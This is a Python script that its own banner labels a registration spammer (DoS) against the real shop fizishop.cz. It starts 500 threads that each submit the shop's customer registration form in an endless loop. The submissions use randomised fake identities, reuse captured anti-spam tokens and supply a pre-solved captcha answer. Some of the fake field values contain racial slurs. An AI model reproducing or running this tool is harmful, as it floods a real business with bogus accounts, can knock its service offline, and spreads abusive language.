import requests
import string
import random
import threading
import os
import time

THREADS = 500
ACTIVE_THREADS = 0

def randomstr(len: int):
    return "".join(random.choice(string.ascii_letters) for x in range(len))

def randomint(len: int):
    return int("".join(random.choice(string.digits) for x in range(len)))

payload = {"firstname": randomstr(5),
"surname": randomstr(10),
"invoice_street": "Bezdomovec "+str(randomint(2)),
"invoice_city": "Negr",
"invoice_zip": randomint(5),
"invoice_country_id": "cz",
"email": f"{randomstr(10)}@nigge.rs",
"phone": "+420 777844544",
"company": "", 
"ico": "", 
"dic": "", 
"firstname_postal": "", 
"surname_postal": "", 
"street": "", 
"city": "", 
"zip": "", 
"country_id": "cz",
"company_postal": "", 
"note": "", 
"nospam": "", 
"_token_": "a42082d6db9e3304314aa4a6906603ad",
"question": "Odečtěte od čísla 2 číslo 1. (vyplňte číslo)",
"answer": 1,
"check": "dzHrtJ7Y2z5C50cA1MRKOw==",
"token": "6319ff7e86a0d",
"company_yn": "", 
"company_yn_checkbox_exist": 1}

sent = 0
other = 0
threads = 0
def post_req():
    global sent, other, ACTIVE_THREADS
    ACTIVE_THREADS += 1
    while ACTIVE_THREADS != THREADS:
        print("Info> waiting for threads to load")
        
        time.sleep(0.5)
    while True:
        r = requests.post("https://www.fizishop.cz/customer/registration/?do=customerRegistrationForm-submit", params=payload)
        if r.status_code == 200:
            sent += 1
            os.system(f"title S: {sent} O: {other} T: {threads}")
        else:
            print(f"Info> failed to post registration request - {r.status_code}")
            other += 1

t = threading.Thread

def printer():
    while True:
        time.sleep(1)
        os.system("cls")
        print(f"""                            _       _     _   
  __ _ _   _  __ _ _   _  | | __ _| |__ | |_ 
 / _` | | | |/ _` | | | | | |/ _` | '_ \| __|
| (_| | |_| | (_| | |_| |_| | (_| | |_) | |_ 
 \__, |\__,_|\__, |\__,_(_)_|\__, |_.__/ \__|
 |___/       |___/           |___/           
> fizishop.cz registration spammer (DoS)   

    S - Sent> {sent}
    O - Other> {other}
    T - Threads> {threads}""")
        
try:
    t(target=printer).start()
    for x in range(THREADS):
        t(target=post_req).start()
        threads += 1
except Exception as err:
    print(err)
    os._exit(0)

while True:
    try:
        time.sleep(1)
    except KeyboardInterrupt:
        os._exit(0)